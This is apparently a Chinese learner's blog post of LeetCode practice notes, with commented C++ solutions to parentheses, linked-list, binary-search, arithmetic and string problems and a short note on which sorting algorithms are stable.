<p>冒泡排序可以做到稳定性，相等的时候不交换，相邻的次序不改变</p>
<p>交换排序能做到稳定，当左边的如果没有右边的大就停住</p>
<p>归并排序能做到稳定，相等的时候先选择左边的，这样有稳定性</p>
<p>快速排序不稳定， 因为partition过程的原因</p>
<p>堆排序也不稳定，因为交换的过程是破坏稳定性的过程</p>
<h4 id="5-有效的括号"><a href="#5-有效的括号" class="headerlink" title="5.有效的括号"></a>5.有效的括号</h4><p>有效的括号这个题也就是利用了栈的性质，也就是先入后出，可以使用栈来解决。这里复习了一下c++中栈操作的使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//首先是进行一个基本的判断</span></span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//这里面是大括号嵌套，并且里面的元素是单引号来控制</span></span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">char</span>&gt; pairs=&#123;</span><br><span class="line">        &#123;<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;[&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pairs.<span class="built_in">count</span>(ch))&#123;</span><br><span class="line">                <span class="keyword">if</span>(stk.<span class="built_in">empty</span>()||stk.<span class="built_in">top</span>()!=pairs[ch])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="6-括号生成"><a href="#6-括号生成" class="headerlink" title="6.括号生成"></a>6.括号生成</h4><p>n代表生成括号的对数，设计一个函数生成所以有效括号组合，这个问题可以使用回溯法生成，首先列出所有的方法，可以看到当左括号数大于或者等于右括号数的时候都是有效的，而当右括号的数大于左括号的数目时，那么就不可能成为有效的了。ps.前面并不满足配对的要求</p>
<p>这个练习的是回溯法，关键的还是要把那个树写出来，看看在哪里进行pop</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">backtracking</span><span class="params">(vector&lt;string&gt;&amp; result,string&amp; current,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(left==right&amp;&amp;left==n)&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(left&lt;n)&#123;</span><br><span class="line">                current.<span class="built_in">push_back</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">                <span class="built_in">backtracking</span>(result,current,left+<span class="number">1</span>,right,n);</span><br><span class="line">                current.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right&lt;left)&#123;</span><br><span class="line">                current.<span class="built_in">push_back</span>(<span class="string">&#x27;)&#x27;</span>);<span class="comment">//单字符还是应该使用‘’</span></span><br><span class="line">                <span class="built_in">backtracking</span>(result,current,left,right+<span class="number">1</span>,n);</span><br><span class="line">                current.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; result;</span><br><span class="line">        string current=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">backtracking</span>(result,current,<span class="number">0</span>,<span class="number">0</span>,n);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="7-两两交换数组中的节点"><a href="#7-两两交换数组中的节点" class="headerlink" title="7.两两交换数组中的节点"></a>7.两两交换数组中的节点</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//这道题可能会使用递归来做比较好一些</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//head-&gt;1-&gt;2(next)-&gt;3-&gt;4</span></span><br><span class="line">        <span class="keyword">if</span>(!head||!head-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* next = head-&gt;next;</span><br><span class="line">        head-&gt;next = <span class="built_in">swapPairs</span>(next-&gt;next);</span><br><span class="line">        next-&gt;next = head;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="8-移除元素"><a href="#8-移除元素" class="headerlink" title="8.移除元素"></a>8.移除元素</h4><p>其实思想就是把元素前面的尽量都是不等于val的元素，可以使用双指针法来解决，一开始想尝试用类似快速排序那种方式进行处理，但是发现在一些特殊情况下处理的不好。那么就实现一个类似冒泡排序的过程，实际上又不是完全的像，是一个元素逐步进行左移的过程，如果一直是不等的，那么就自我替换，一个一个右移，如果有相等的，会把相等的跳过然后替换，只不过相等的值最终被剔除了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> right=<span class="number">0</span>;right&lt;n;right++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[right]!=val)&#123;</span><br><span class="line">                nums[left]=nums[right];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="9-搜索插入位置"><a href="#9-搜索插入位置" class="headerlink" title="9.搜索插入位置"></a>9.搜索插入位置</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//这个明显是一个二分查找的题目</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">searchInsert</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left =<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="comment">//这个等于的位置很关键，因为当减完后你再判断一下大小关系，如果大就下一个，如果等就找到，如果小就减一个</span></span><br><span class="line">            <span class="type">int</span> mid = left+(right-left);</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&gt;target)</span><br><span class="line">            right = mid <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="10-最后一个单词的长度"><a href="#10-最后一个单词的长度" class="headerlink" title="10.最后一个单词的长度"></a>10.最后一个单词的长度</h4><p>简单题，只要遍历最后一个单词的长度即可，这时候采用的是从后遍历策略，也就是从后边第一个不是空格的字符开始，到空格字符为止，这里要注意的一点是如果只有一个单词会出现越界，因此要对index是否为-1进行判断</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLastWord</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> index = n<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(s[index]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            index--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(index!=<span class="number">-1</span>&amp;&amp;s[index]!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">            index--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="11-加一"><a href="#11-加一" class="headerlink" title="11.加一"></a>11.加一</h4><p>给定一个数组，每个位置存数字的一位，让这个数组整体加1，但是会存在进位，一直搞不好carry，存在覆盖问题，调整了好多遍代码然后通过，不过看了官方代码感觉还是复杂了一些.但是我代码是按照一个加法器来写的，能处理更加一般化的问题，而官方的代码更像是针对此题的特殊化，主要是判断是否为9.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//加法题判断进位</span></span><br><span class="line">        <span class="comment">//int carry;</span></span><br><span class="line">        <span class="type">int</span> last = digits.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> carry = (digits[last]+<span class="number">1</span>)/<span class="number">10</span>;</span><br><span class="line">        digits[last] = (digits[last]+<span class="number">1</span>)%<span class="number">10</span>;   </span><br><span class="line">        <span class="keyword">while</span>(carry&amp;&amp;last)&#123;</span><br><span class="line">            <span class="type">int</span> newcarry = (digits[last<span class="number">-1</span>]+carry)/<span class="number">10</span>;</span><br><span class="line">            digits[last<span class="number">-1</span>]=(digits[last<span class="number">-1</span>]+carry)%<span class="number">10</span>;</span><br><span class="line">            carry = newcarry;</span><br><span class="line">            last--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(last==<span class="number">0</span>&amp;&amp;carry==<span class="number">1</span>)&#123;</span><br><span class="line">            digits[<span class="number">0</span>] =<span class="number">1</span>;</span><br><span class="line">            digits.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="12-二进制求和"><a href="#12-二进制求和" class="headerlink" title="12.二进制求和"></a>12.二进制求和</h4><p>前一个题是数组，下面一道题直接变成二进制字符串求和。这个题就有点归并排序那个味道了。一开始想使用上面那个加一方法来着，后来发现确实是在字符串处理上不是太顺手，顺势看了一眼答案，就按答案的思路写了，说实话答案用了大量的三目运算符不过也认了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">addBinary</span><span class="params">(string a, string b)</span> </span>&#123;</span><br><span class="line">     string ans; <span class="comment">//创建一个最后结果的string</span></span><br><span class="line">     <span class="built_in">reverse</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>());</span><br><span class="line">     <span class="built_in">reverse</span>(b.<span class="built_in">begin</span>(),b.<span class="built_in">end</span>());</span><br><span class="line">     <span class="type">int</span> n = <span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">     <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        carry += i&lt;a.<span class="built_in">size</span>()?a.<span class="built_in">at</span>(i)==<span class="string">&#x27;1&#x27;</span>:<span class="number">0</span>;<span class="comment">//判断i的位置，如果i在数组内就取相应位置的值，如果超出了数组，那么就取0</span></span><br><span class="line">        carry += i&lt;b.<span class="built_in">size</span>()?b.<span class="built_in">at</span>(i)==<span class="string">&#x27;1&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">        ans.<span class="built_in">push_back</span>((carry)%<span class="number">2</span>==<span class="number">0</span>?<span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        carry /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry==<span class="number">1</span>)</span><br><span class="line">    ans.<span class="built_in">push_back</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="13-x的平方根"><a href="#13-x的平方根" class="headerlink" title="13.x的平方根"></a>13.x的平方根</h4><p>求x的算数平方根，不让使用pow这样的函数，有点棘手。想到的就是从1开始暴力一点，后来发现各种问题，2，1，0都解决不了，而且可能出现overflow的问题。。。看了下解答有牛顿法还有指数法，记不下来，不如还是使用二分法来解决吧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span>  l=<span class="number">0</span>,r=x,ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="type">int</span> mid = l+(r-l)/<span class="number">2</span>;<span class="comment">//找到中值的位置</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">long</span> <span class="type">long</span>)mid*mid&lt;=x)&#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="14-爬楼梯"><a href="#14-爬楼梯" class="headerlink" title="14.爬楼梯"></a>14.爬楼梯</h4><p>正在爬楼梯，很熟悉的题，两种方法，一种是递归，一种是动态规划，准备都写一下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//递归求解</span></span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">climbStairs</span>(n<span class="number">-1</span>)+<span class="built_in">climbStairs</span>(n<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>果然递归。。。超时，还是用动态规划吧。。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个dp数组</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">2</span>)</span></span>;</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;n+<span class="number">2</span>;i++)&#123;</span><br><span class="line">        dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="15-删除排序链表中的重复元素"><a href="#15-删除排序链表中的重复元素" class="headerlink" title="15.删除排序链表中的重复元素"></a>15.删除排序链表中的重复元素</h4><p>和之前在数组中删除重复元素很像，但是学数据结构的时候都知道，链表的增删改查是很方便的，那就直接删除吧，也不用双指针了，就是遍历然后删除</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* newhead = head;</span><br><span class="line">        <span class="keyword">while</span>(head&amp;&amp;head-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next-&gt;val==head-&gt;val)&#123;</span><br><span class="line">                ListNode* temp = head-&gt;next;</span><br><span class="line">                head-&gt;next=head-&gt;next-&gt;next;</span><br><span class="line">                <span class="comment">//free(temp);</span></span><br><span class="line">                temp-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newhead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="16-回文数"><a href="#16-回文数" class="headerlink" title="16.回文数"></a>16.回文数</h4><p>回文数，这个题使用python直接一行就可以解决a[::-1]。。。但是现在我们需要使用c语言来完成这件事，因此可能需要更多的代码量。一个思路是回文数将后面一半反转以后然后和前一部分进行比较，当然负数要排除</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//下面是做回文数的过程</span></span><br><span class="line">        <span class="type">int</span> reversenumber = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//下面是一些特殊情况</span></span><br><span class="line">        <span class="comment">//当x是个负数一定就不会是回文数了</span></span><br><span class="line">        <span class="comment">//当x最后一位是0除非它是0否则不是会问数</span></span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>||(x%<span class="number">10</span>==<span class="number">0</span>&amp;&amp;x!=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//下面是进行求reversenumber的过程</span></span><br><span class="line">        <span class="keyword">while</span>(reversenumber&lt;x)&#123;</span><br><span class="line">            reversenumber = reversenumber*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reversenumber==x || reversenumber/<span class="number">10</span>==x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="17-罗马数字转整数"><a href="#17-罗马数字转整数" class="headerlink" title="17.罗马数字转整数"></a>17.罗马数字转整数</h4><p>给定一个罗马数组将这个数字转成整数，好像从后往前查字典就可以，但是就是可能遇到I在前面这种情况。这样就判断一下后一个字符和前面的大小关系，当然也想到了第一个就是I这种情况，不过没关系，我们的ans可以是负数嘛</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">     unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; dir=&#123;</span><br><span class="line">         &#123;<span class="string">&#x27;I&#x27;</span>,<span class="number">1</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;V&#x27;</span>,<span class="number">5</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;X&#x27;</span>,<span class="number">10</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;L&#x27;</span>,<span class="number">50</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;C&#x27;</span>,<span class="number">100</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;D&#x27;</span>,<span class="number">500</span>&#125;,</span><br><span class="line">         &#123;<span class="string">&#x27;M&#x27;</span>,<span class="number">1000</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i+<span class="number">1</span>&lt;n&amp;&amp;dir[s[i]]&lt;dir[s[i+<span class="number">1</span>]])&#123;</span><br><span class="line">            ans -= dir[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans += dir[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="18-最长公共前缀"><a href="#18-最长公共前缀" class="headerlink" title="18.最长公共前缀"></a>18.最长公共前缀</h4><p>一开始是想用那种纵向比较扫描的方法，后来看到了有分治的方法，那就不如用分治吧。分治就是将整个数组统共来看，先比较一半，然后再比较另一半，这样求一个公共的前缀，方法上没啥特殊的地方</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230225213730810.png" alt="image-20230225213730810"></p>
<p>这个题就是三部分，害，其实可以按照两部分来写，也就是标准的divide-and -conquer的思路，不断二分，只不过这里合并用了一个新函数解决</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">commonPre</span><span class="params">(string s1,string s2)</span></span>&#123;</span><br><span class="line">        string ans =<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> length1 = s1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> length2 = s2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">min</span>(length1,length2);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s1[i]==s2[i])</span><br><span class="line">            ans.<span class="built_in">push_back</span>(s1[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function">string <span class="title">LCP</span><span class="params">(vector&lt;string&gt;&amp; strs,<span class="type">int</span> start,<span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">            <span class="keyword">return</span> strs[start];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = start +(end-start)/<span class="number">2</span>;</span><br><span class="line">        string s1 = <span class="built_in">LCP</span>(strs,start,mid);</span><br><span class="line">        string s2 = <span class="built_in">LCP</span>(strs,mid+<span class="number">1</span>,end);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">commonPre</span>(s1,s2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//分治法解决最长的前缀问题</span></span><br><span class="line">        <span class="type">int</span> n = strs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">LCP</span>(strs,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">//return LCP(vector&lt;string&gt;&amp; strs,int start,int end)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
